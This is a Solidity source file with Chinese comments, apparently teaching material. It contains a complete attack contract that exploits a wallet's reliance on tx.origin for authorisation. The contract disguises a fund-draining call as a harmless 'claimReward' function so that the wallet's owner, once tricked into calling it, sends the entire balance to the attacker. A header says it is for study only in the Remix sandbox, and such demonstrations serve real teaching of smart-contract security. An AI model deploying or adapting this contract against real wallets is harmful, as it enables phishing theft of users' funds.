// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * ⚠️ 仅供学习、请勿用于攻击真实合约。仅在 Remix VM 沙盒演示。
 *
 * tx.origin 钓鱼的攻击合约。
 * 它伪装成一个人畜无害的功能（claimReward），
 * 一旦 owner（受害者）来调用，就在内部把金库掏空。
 */

interface IVulnerableWallet {
    function transfer(address payable to, uint256 amount) external;
}

contract PhishingAttacker {
    IVulnerableWallet public immutable wallet;
    address payable public immutable attacker;

    constructor(address walletAddr) {
        wallet = IVulnerableWallet(walletAddr);
        attacker = payable(msg.sender);
    }

    /**
     * 表面上是"领取奖励"，诱骗 owner 来点。
     * owner 一调用，这里的 msg.sender/ tx.origin 情况是：
     *   - 对本合约：msg.sender = owner
     *   - 本合约再调用 wallet.transfer 时，对 wallet：
     *       msg.sender = 本攻击合约, tx.origin = owner
     * VulnerableWallet 用 tx.origin 判断，误以为是 owner 本人 → 放行。
     */
    function claimReward() external {
        // 把金库里的钱全部转给攻击者
        wallet.transfer(attacker, address(wallet).balance);
    }
}
